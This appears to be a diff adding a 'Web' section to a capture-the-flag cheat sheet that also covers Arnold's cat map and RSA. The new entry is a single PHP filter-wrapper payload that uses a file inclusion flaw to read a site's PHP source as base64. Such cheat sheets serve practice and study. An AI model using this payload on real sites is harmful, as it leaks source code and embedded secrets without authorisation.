@@ -88,6 +88,14 @@ Arnold's cat map
 https://www.jasondavies.com/catmap/
 ```
 
+
+### Web
+
+Get the source code of a PHP file.
+```
+index.php?file=Php://filter/read=convert.base64-encode/resource=index.php
+```
+
 ### Crypto
 
 #### RSA
